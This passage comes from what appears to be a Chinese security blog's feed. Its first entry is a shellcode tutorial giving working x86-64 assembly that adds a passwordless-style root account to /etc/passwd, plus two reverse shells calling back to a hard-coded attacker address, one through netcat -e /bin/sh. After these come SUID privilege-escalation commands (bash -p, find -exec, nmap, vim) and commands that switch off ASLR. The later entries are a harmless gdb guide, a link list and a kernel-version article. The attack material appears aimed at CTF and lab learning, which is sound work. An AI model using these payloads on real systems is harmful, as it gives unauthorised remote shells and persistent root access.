class="line">;Purpose:       adds user &quot;t0r&quot; with password &quot;Winner&quot; to /etc/passwd</span><br><span class="line">;executed syscalls:     setreuid, setregid, open, write, close, exit</span><br><span class="line">;Result:        t0r:3UgT5tXKUkUFg:0:0::/root:/bin/bash</span><br><span class="line">;syscall op codes:  /usr/include/x86_64-linux-gnu/asm/unistd_64.h</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    ;sys_setreuid(uint ruid, uint euid)</span><br><span class="line">    xor     rax,    rax</span><br><span class="line">    mov     al,     113                     ;syscall sys_setreuid</span><br><span class="line">    xor     rbx,    rbx                     ;arg 1 -- set real uid to root</span><br><span class="line">    mov     rcx,    rbx                     ;arg 2 -- set effective uid to root</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ;sys_setregid(uint rgid, uint egid)</span><br><span class="line">    xor     rax,    rax</span><br><span class="line">    mov     al,     114                     ;syscall sys_setregid</span><br><span class="line">    xor     rbx,    rbx                     ;arg 1 -- set real uid to root</span><br><span class="line">    mov     rcx,    rbx                     ;arg 2 -- set effective uid to root</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ;push all strings on the stack prior to file operations.</span><br><span class="line">    xor rbx,    rbx</span><br><span class="line">    mov     ebx,    0x647773FF</span><br><span class="line">    shr     rbx,    8</span><br><span class="line">    push    rbx                             ;string \00dws</span><br><span class="line">    mov     rbx,    0x7361702f6374652f</span><br><span class="line">    push    rbx                             ;string sap/cte/</span><br><span class="line">    mov     rbx,    0x0A687361622F6EFF</span><br><span class="line">    shr     rbx,    8</span><br><span class="line">    push    rbx                             ;string \00\nhsab/n</span><br><span class="line">    mov     rbx,    0x69622F3A746F6F72</span><br><span class="line">    push    rbx                             ;string ib/:toor</span><br><span class="line">    mov     rbx,    0x2F3A3A303A303A67</span><br><span class="line">    push    rbx                             ;string /::0:0:g</span><br><span class="line">    mov rbx,    0x46556B554B587435</span><br><span class="line">    push    rbx             ;string FUkUKXt5</span><br><span class="line">    mov rbx,    0x546755333A723074</span><br><span class="line">    push    rbx             ;string TgU3:r0t</span><br><span class="line">    </span><br><span class="line">    ;prelude to doing anything useful...</span><br><span class="line">    mov rbx,    rsp         ;save stack pointer for later use</span><br><span class="line">    push    rbp             ;store base pointer to stack so it can be restored later</span><br><span class="line">    mov rbp,    rsp         ;set base pointer to current stack pointer</span><br><span class="line">    </span><br><span class="line">    ;sys_open(char* fname, int flags, int mode)</span><br><span class="line">    sub rsp,        16</span><br><span class="line">    mov [rbp - 16], rbx     ;store pointer to &quot;t0r..../bash&quot;</span><br><span class="line">    mov si,     0x0401      ;arg 2 -- flags</span><br><span class="line">    mov rdi,        rbx</span><br><span class="line">    add rdi,        40      ;arg 1 -- pointer to &quot;/etc/passwd&quot;</span><br><span class="line">    xor rax,        rax</span><br><span class="line">    mov al,     2       ;syscall sys_open</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ;sys_write(uint fd, char* buf, uint size)</span><br><span class="line">    mov [rbp - 4],  eax     ;arg 1 -- fd is retval of sys_open. save fd to stack for later use.</span><br><span class="line">    mov rcx,        rbx     ;arg 2 -- load rcx with pointer to string &quot;t0r.../bash&quot;</span><br><span class="line">    xor rdx,        rdx</span><br><span class="line">    mov dl,     39      ;arg 3 -- load rdx with size of string &quot;t0r.../bash\00&quot;</span><br><span class="line">    mov rsi,        rcx     ;arg 2 -- move to source index register</span><br><span class="line">    mov rdi,        rax     ;arg 1 -- move to destination index register</span><br><span class="line">    xor     rax,            rax</span><br><span class="line">    mov     al,             1               ;syscall sys_write</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ;sys_close(uint fd)</span><br><span class="line">    xor rdi,        rdi</span><br><span class="line">    mov edi,        [rbp - 4]   ;arg 1 -- load stored file descriptor to destination index register</span><br><span class="line">    xor rax,        rax</span><br><span class="line">    mov al,     3       ;syscall sys_close</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    ;sys_exit(int err_code)</span><br><span class="line">    xor rax,    rax</span><br><span class="line">    mov al, 60          ;syscall sys_exit</span><br><span class="line">    xor rbx,    rbx         ;arg 1 -- error code</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><h1 id="5-反向-shell"><a class="markdownIt-Anchor" href="#5-反向-shell"></a> 5. 反向 shell</h1><h2 id="50-部署"><a class="markdownIt-Anchor" href="#50-部署"></a> 5.0 部署</h2><p>【1】先在攻击端（kali: 192.168.188.141）输入以下命令。</p><p><img src="/2022/09/06/shellcode-linux-x86-64/image-20220817211511413.png" alt="image-20220817211511413"></p><p>【2】然后在靶机端（Kylin：192.168.188.146）运行shellcode</p><h2 id="51-netcat-命令行"><a class="markdownIt-Anchor" href="#51-netcat-命令行"></a> 5.1 netcat 命令行</h2><p>由于 kylin 上原装的 netcat 是阉割版本，没有 -e 参数的，我们先需要安装完整版的 netcat。我将它安装在 /home/sakura/tools/netcat 目录下。</p><blockquote><p>安装教程：<a href="https://www.freebuf.com/sectool/243115.html">这可能是netcat最全的使用指南</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">; netcatRevTcp.asm</span><br><span class="line">; 注：以下参数需要根据您的电脑上netcat的安装目录重新配置，IP地址也需要重新配置。</span><br><span class="line">;execve(&quot;/home/sakura/tools/netcat/src/netcat&quot;, [&quot;/home/sakura/tools/netcat/src/ne&quot;..., &quot;-e&quot;, &quot;/bin/sh&quot;, &quot;192.168.188.141&quot;, &quot;5566&quot;], NULL) = 0</span><br><span class="line"></span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    push rbp</span><br><span class="line">    mov rbp, rsp</span><br><span class="line">    sub rsp, 0x40</span><br><span class="line">    mov qword rax, &#x27;5566AAAA&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;188.141A&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;192.168.&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;/bin/shA&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;tcatA-eA&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;t/src/ne&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;ls/netca&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;kura/too&#x27;</span><br><span class="line">push rax</span><br><span class="line">mov qword rax, &#x27;/home/sa&#x27;</span><br><span class="line">push rax</span><br><span class="line">    </span><br><span class="line">    xor byte [rsp+36], 0x41</span><br><span class="line">   xor byte [rsp+39], 0x41</span><br><span class="line">   xor byte [rsp+47], 0x41</span><br><span class="line">   xor byte [rsp+63], 0x41</span><br><span class="line">    xor byte [rsp+71], 0x41</span><br><span class="line">    xor byte [rsp+70], 0x41</span><br><span class="line">    xor byte [rsp+69], 0x41</span><br><span class="line">    xor byte [rsp+68], 0x41</span><br><span class="line"></span><br><span class="line">xor rax, rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">push rax</span><br><span class="line">lea rbx, [rdi+64]</span><br><span class="line">push rbx</span><br><span class="line">lea rbx, [rdi+48]</span><br><span class="line">push rbx</span><br><span class="line">lea rbx, [rdi+40]</span><br><span class="line">push rbx</span><br><span class="line">lea rbx, [rdi+37]</span><br><span class="line">push rbx</span><br><span class="line">push rdi</span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor rdx, rdx </span><br><span class="line"></span><br><span class="line">   add al , 59</span><br><span class="line">   syscall</span><br></pre></td></tr></table></figure><h2 id="52-系统调用"><a class="markdownIt-Anchor" href="#52-系统调用"></a> 5.2 系统调用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">; revTcp.asm</span><br><span class="line">; 注：在17行和18行的ip地址需要根据实际环境重新配置</span><br><span class="line">; 攻击端ip：192.168.188.141</span><br><span class="line">; 攻击端 post：5566</span><br><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    ;Socket</span><br><span class="line">    xor rdx, rdx                ; zero out rdx</span><br><span class="line">    mov rsi, rdx                ; AF_NET = 1</span><br><span class="line">    inc rsi                     ; rsi = AF_NET</span><br><span class="line">    mov rdi, rsi                ; SOCK_STREAM = 2</span><br><span class="line">    inc rdi                     ; rdi = SOCK_STREAM</span><br><span class="line">    add ax, 0x29</span><br><span class="line">    syscall                   ; call socket(SOCK_STREAM, AF_NET, 0);</span><br><span class="line"></span><br><span class="line">    mov r12, rax</span><br><span class="line">    sub rsp,0x10</span><br><span class="line">    mov dword [rsp+0x4],0x8dbca8c0; ip = 192.168.188.141</span><br><span class="line">    mov word [rsp+0x2],0xbe15; post = 5566</span><br><span class="line">    mov word [rsp],0x2</span><br><span class="line"></span><br><span class="line">    ; Connect = 0x2a</span><br><span class="line">    mov rdi, rax                ; move the saved socket fd into rdi</span><br><span class="line">    mov rsi, rsp                ; move the saved sock_addr_in into rsi</span><br><span class="line">    add dx, 0x10                ; add 0x10 to rdx</span><br><span class="line">    xor rax, rax    </span><br><span class="line">    add ax, 0x2a</span><br><span class="line">    syscall                     ; call connect(rdi, rsi, rdx)</span><br><span class="line"></span><br><span class="line">    xor rsi, rsi                ; zero out rsi</span><br><span class="line"></span><br><span class="line">    dup:</span><br><span class="line">    xor rax, rax</span><br><span class="line">    add ax, 0x21                ; move the syscall for dup2 into rax</span><br><span class="line">    mov rdi, r12                ; move the FD for the socket into rdi</span><br><span class="line">    syscall                     ; call dup2(rdi, rsi)</span><br><span class="line"></span><br><span class="line">    cmp rsi, 0x2                ; check to see if we are still under 2</span><br><span class="line">    inc rsi                     ; inc rsi</span><br><span class="line">    jbe dup                     ; jmp if less than 2</span><br><span class="line"></span><br><span class="line">    ;sub r8, 0x1F                ; setup the exec syscall at 0x3b</span><br><span class="line">    xor rax, rax    </span><br><span class="line">    add ax, 0x3b                 ; move the syscall into rax</span><br><span class="line"></span><br><span class="line">    ;exec</span><br><span class="line">    xor rdx, rdx ; zero out rdx</span><br><span class="line">    mov qword rbx, &#x27;//bin/sh&#x27;  ; &#x27;/bin/sh&#x27; in hex</span><br><span class="line">    shr rbx,0x8                  ; shift right to create the null terminator</span><br><span class="line">    push rbx</span><br><span class="line"></span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    push rdx</span><br><span class="line">    push rdi              ; move the command from the stack to rdi</span><br><span class="line">    mov rsi, rsp                ; zero out rsi</span><br><span class="line">    syscall                     ; call exec(rdi, rsi, 0)</span><br></pre></td></tr></table></figure><h1 id="6-提权方法"><a class="markdownIt-Anchor" href="#6-提权方法"></a> 6. 提权方法</h1><h2 id="61-bash"><a class="markdownIt-Anchor" href="#61-bash"></a> 6.1 bash</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~$ sudo chmod u+s /bin/bash</span><br><span class="line">sakura@Kylin:~$ ll /bin/bash</span><br><span class="line">-rwsr-xr-x 1 root root 1183448 6月   4  2021 /bin/bash*</span><br><span class="line">sakura@Kylin:~$ bash -p</span><br><span class="line">bash-5.0# whoami</span><br><span class="line">root</span><br><span class="line">bash-5.0# id</span><br><span class="line">uid=1000(sakura) gid=1000(sakura) euid=0(root) 组=1000(sakura),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),119(lpadmin),129(sambashare)</span><br><span class="line">bash-5.0# ./addRootUser </span><br><span class="line">bash-5.0# cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">。。。。。。</span><br><span class="line">toor:sXuCKi7k3Xh/s:0:0::/root:/bin/sh</span><br><span class="line">bash-5.0# </span><br></pre></td></tr></table></figure><h2 id="62-nmap"><a class="markdownIt-Anchor" href="#62-nmap"></a> 6.2 nmap</h2><p>判断nmap版本，<code>nmap -v</code>，如果版本在2.02至5.21之间，则可以提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">nmap&gt; </span><span class="language-bash">!sh</span></span><br><span class="line">sh-3.2# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><h2 id="63-find"><a class="markdownIt-Anchor" href="#63-find"></a> 6.3 find</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~$ sudo chmod u+s /bin/find</span><br><span class="line">sakura@Kylin:~$ ll /bin/find</span><br><span class="line">-rwsr-xr-x 1 root root 320160 4月  15  2020 /bin/find*</span><br><span class="line">sakura@Kylin:~/文档$ touch anyfile</span><br><span class="line">sakura@Kylin:~/文档$ find anyfile -exec whoami \;</span><br><span class="line">root</span><br><span class="line">sakura@Kylin:~/文档$ </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#进入shell</span><br><span class="line">sakura@Kylin:~/文档$ find anyfile -exec &quot;/bin/bash&quot; &quot;-p&quot; \;</span><br><span class="line">sh-5.0# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure><h2 id="64-vim"><a class="markdownIt-Anchor" href="#64-vim"></a> 6.4 vim</h2><p>利用vim提权的思路是修改etc/passwd文件，为自己添加一个有root权限的用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~$ sudo chmod u+s /bin/vim.tiny</span><br><span class="line">sakura@Kylin:~$ vim.tiny /etc/passwd</span><br><span class="line">sakura@Kylin:~$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">、、、、</span><br><span class="line">hello</span><br><span class="line">sakura@Kylin:~$ </span><br></pre></td></tr></table></figure><h1 id="7-关闭-aslr"><a class="markdownIt-Anchor" href="#7-关闭-aslr"></a> 7. 关闭 ASLR</h1><p><strong>配置选项</strong></p><ul><li>0 = 关闭</li><li>1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）</li><li>2 = 全随机。除了1中所述，还有heap。</li></ul><p><strong>方法一： 手动修改randomize_va_space文件</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure><p>注意，这里是先进root权限，后执行。不要问为什么sudo echo 0 &gt; /proc/sys/kernel/randomize_va_space为什么会报错</p><p><strong>方法二： 使用sysctl控制ASLR</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">sysctl -w kernel.randomize_va_space=0</span></span><br></pre></td></tr></table></figure><p>这是一种<strong>临时改变</strong>随机策略的方法，重启之后将恢复默认。如果需要永久保存配置，需要在配置文件 /etc/sysctl.conf 中增加这个选项。</p><p><strong>方法三： 使用setarch控制单个程序的随机化</strong><br>如果你想历史关闭单个程序的ASLR，使用setarch是很好的选择。setarch命令如其名，改变程序的运行架构环境，并可以自定义环境flag。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setarch `uname -m` -R ./your_program</span><br></pre></td></tr></table></figure><p>-R参数代表关闭地址空间随机化（开启ADDR_NO_RANDOMIZE)</p><p><strong>方法四： 在GDB场景下，使用set disable-randomization off</strong><br>在调试特定程序时，可以通过 <code>set disable-randomization</code> 命令开启或者关闭地址空间随机化。默认是关闭随机化的，也就是on状态。</p><p>当然，这里开启，关闭和查看的方法看起来就比较正规了。</p><p>关闭ASLR：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set disable-randomization on</span><br></pre></td></tr></table></figure><p>开启ASLR：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set disable-randomization off</span><br></pre></td></tr></table></figure><p>查看ASLR状态：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show disable-randomization</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;本文是我的另一篇文章的精简版，删除了参考文章，以及一些额外的解释，只保留了最关键的部分。如想学习写shellcode，可以去阅读 &lt;a href=&quot;https://www.rgzzplus.com/2022/08/08/L</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="shellcode" scheme="https://www.rgzzplus.com/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>gdb中x的用法</title>
    <link href="https://www.rgzzplus.com/2022/09/06/gdb%E4%B8%ADx%E7%9A%84%E7%94%A8%E6%B3%95/"/>
    <id>https://www.rgzzplus.com/2022/09/06/gdb%E4%B8%ADx%E7%9A%84%E7%94%A8%E6%B3%95/</id>
    <published>2022-09-06T06:29:37.000Z</published>
    <updated>2022-09-06T06:30:21.673Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文转载自：<a href="https://www.jianshu.com/p/589308dd36dc">gdb ---- x命令详解</a></p><p>作者：Adam_0<br>链接：<a href="https://www.jianshu.com/p/589308dd36dc">https://www.jianshu.com/p/589308dd36dc</a><br>来源：简书</p></blockquote><p>examine命令缩写为x<br>格式：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/<span class="language-xml">&lt;n/f/u&gt;</span>  &lt;addr&gt;</span><br></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">n:是正整数，表示需要显示的内存单元的个数，即从当前地址向后显示n个内存单元的内容，</span><br><span class="line">一个内存单元的大小由第三个参数u定义。</span><br><span class="line"></span><br><span class="line">f:表示addr指向的内存内容的输出格式，s对应输出字符串，此处需特别注意输出整型数据的格式：</span><br><span class="line">  x 按十六进制格式显示变量.</span><br><span class="line">  d 按十进制格式显示变量。</span><br><span class="line">  u 按十进制格式显示无符号整型。</span><br><span class="line">  o 按八进制格式显示变量。</span><br><span class="line">  t 按二进制格式显示变量。</span><br><span class="line">  a 按十六进制格式显示变量。</span><br><span class="line">  c 按字符格式显示变量。</span><br><span class="line">  f 按浮点数格式显示变量。</span><br><span class="line">  i 指令地址格式</span><br><span class="line"></span><br><span class="line">u:就是指以多少个字节作为一个内存单元-unit,默认为<span class="number">4</span>。u还可以用被一些字符表示:</span><br><span class="line">  如b=<span class="number">1</span> <span class="built_in">byte</span>, h=<span class="number">2</span> bytes,w=<span class="number">4</span> bytes,g=<span class="number">8</span> bytes.</span><br><span class="line"></span><br><span class="line">&lt;addr&gt;:表示内存地址。</span><br><span class="line"><span class="function">Format letters are <span class="title">o</span>(<span class="params">octal</span>), <span class="title">x</span>(<span class="params">hex</span>), <span class="title">d</span>(<span class="params"><span class="built_in">decimal</span></span>), <span class="title">u</span>(<span class="params">unsigneddecimal</span>),</span></span><br><span class="line"><span class="function"><span class="title">t</span>(<span class="params">binary</span>), <span class="title">f</span>(<span class="params"><span class="built_in">float</span></span>), <span class="title">a</span>(<span class="params">address</span>), <span class="title">i</span>(<span class="params">instruction</span>), <span class="title">c</span>(<span class="params"><span class="built_in">char</span></span>) <span class="keyword">and</span> <span class="title">s</span>(<span class="params"><span class="built_in">string</span></span>).</span></span><br><span class="line"><span class="function">Size letters are <span class="title">b</span>(<span class="params"><span class="built_in">byte</span></span>), <span class="title">h</span>(<span class="params">halfword</span>), <span class="title">w</span>(<span class="params">word</span>), <span class="title">g</span>(<span class="params">giant, <span class="number">8b</span>ytes</span>)</span></span><br></pre></td></tr></table></figure><p><strong>举例:</strong><br>x/3uh buf<br>表示从内存地址buf读取内容，</p><p>3表示三个单位，<br>u表示按十六进制显示<br>h表示以双字节为一个单位</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文转载自：&lt;a href=&quot;https://www.jianshu.com/p/589308dd36dc&quot;&gt;gdb ---- x命令详解&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者：Adam_0&lt;br&gt;
链接：&lt;a href=&quot;https://www.jians</summary>
      
    
    
    
    <category term="转载" scheme="https://www.rgzzplus.com/categories/%E8%BD%AC%E8%BD%BD/"/>
    
    
    <category term="gdb" scheme="https://www.rgzzplus.com/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>安全论坛and博客</title>
    <link href="https://www.rgzzplus.com/2022/09/05/%E5%AE%89%E5%85%A8%E5%AA%92%E4%BD%93or%E5%8D%9A%E5%AE%A2/"/>
    <id>https://www.rgzzplus.com/2022/09/05/%E5%AE%89%E5%85%A8%E5%AA%92%E4%BD%93or%E5%8D%9A%E5%AE%A2/</id>
    <published>2022-09-05T13:29:54.000Z</published>
    <updated>2022-09-05T13:46:48.958Z</updated>
    
    <content type="html"><![CDATA[<p>媒体：</p><ul><li><a href="https://www.cnblogs.com/">博客园</a></li><li><a href="https://bbs.pediy.com/">看雪</a></li><li><a href="https://www.blackhat.com/">blackhat</a></li><li><a href="https://www.bugku.com/forum.php">bugku</a></li><li><a href="http://www.icse-conferences.org/">ICSE</a></li><li><a href="https://geeknb.com/">极牛网</a></li><li><a href="https://bbs.kafan.cn/forum.php?mod=forumdisplay&amp;fid=7&amp;filter=typeid&amp;typeid=31">卡饭论坛</a></li><li><a href="https://www.freebuf.com/">FREEBUF</a></li><li><a href="https://blogsurf.io/">Blog Surf</a></li><li><a href="http://phrack.org/issues/60/10.html">PHRACK</a></li><li><a href="https://www.anquanke.com/">安全客</a></li><li><a href="https://packetstormsecurity.com/">packet_storm</a></li><li><a href="https://www.cnhackteam.org/">黑客世界论坛</a></li><li><a href="https://www.t00ls.com/">tools</a></li><li><a href="https://xz.aliyun.com/">先知社区</a></li></ul><p>靶场：</p><ul><li><a href="https://adworld.xctf.org.cn/home/index">攻防世界</a></li><li><a href="https://ctf.bugku.com/index.html">CTF-bugku</a></li><li><a href="https://www.ctfhub.com/#/index">CTFhub</a></li><li><a href="https://book.nu1l.com/tasks/">从0到1：CTFer成长之路</a></li><li><a href="https://www.exploit-db.com/">Exploit Database</a></li><li><a href="http://www.shell-storm.org/shellcode/">shell-storm</a></li><li><a href="https://www.kancloud.cn/alex_wsc/android/506821"><strong>Android</strong></a></li></ul><p>博客：</p><ul><li><a href="https://www.cnblogs.com/2014asm/category/1310367.html">我是小三</a> ——pwn</li><li><a href="https://www.cnblogs.com/LY613313">爱喝奶茶的沐沐</a> ——pwn</li><li><a href="https://www.giantbranch.cn/">giantbranch</a> ——fuzzing</li><li><a href="https://www.jarvisw.com/">Jarvis</a> ——pwn</li><li><a href="https://jvns.ca/">Julia Evans</a> ——大佬</li><li><a href="https://www.onctf.com/"> 骁隆 </a> ——pwn+web</li><li><a href="https://v0w.top/">V0W’s Blog</a> ——web</li><li><a href="https://www.cnblogs.com/linuxsec/">linuxsec</a> ——web</li><li><a href="http://blog.rchapman.org/">瑞安·A·查普曼</a> ——大佬</li><li><a href="https://sploitfun.wordpress.com/">sploitF-U-N</a> ——pwn</li><li><a href="https://strcpy.me/">virusdefender’s blog</a> ——pwn</li><li><a href="http://www.fuzzysecurity.com/index.html">模糊安全</a> ——大佬们</li></ul><blockquote><p>其它博客推荐文章：</p><p><a href="https://zhuanlan.zhihu.com/p/23701240">https://zhuanlan.zhihu.com/p/23701240</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;媒体：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/&quot;&gt;博客园&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://bbs.pediy.com/&quot;&gt;看雪&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://ww</summary>
      
    
    
    
    <category term="收藏夹" scheme="https://www.rgzzplus.com/categories/%E6%94%B6%E8%97%8F%E5%A4%B9/"/>
    
    
    <category term="论坛&amp;博客" scheme="https://www.rgzzplus.com/tags/%E8%AE%BA%E5%9D%9B-%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>查看linux内核版本</title>
    <link href="https://www.rgzzplus.com/2022/09/05/%E6%9F%A5%E7%9C%8Blinux%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC/"/>
    <id>https://www.rgzzplus.com/2022/09/05/%E6%9F%A5%E7%9C%8Blinux%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC/</id>
    <published>2022-09-05T13:28:04.000Z</published>
    <updated>2022-09-05T13:46:39.722Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文转载自：<a href="https://cloud.tencent.com/developer/article/1878840">Linux查看内核版本命令</a></p></blockquote><h2 id="使用uname命令查找linux内核"><a class="markdownIt-Anchor" href="#使用uname命令查找linux内核"></a> <strong>使用uname命令查找Linux内核</strong></h2><p>uname是用于获取系统信息的Linux命令。您也可以使用它来确定您使用的是32位还是64位系统。</p><p>打开一个终端并使用以下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[linuxmi@linux:~/www.xxx.com]$ uname -r</span><br></pre></td></tr></table></figure><p>输出将类似于以下内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5.3</span><span class="number">.0</span>-<span class="number">28</span>-generic</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
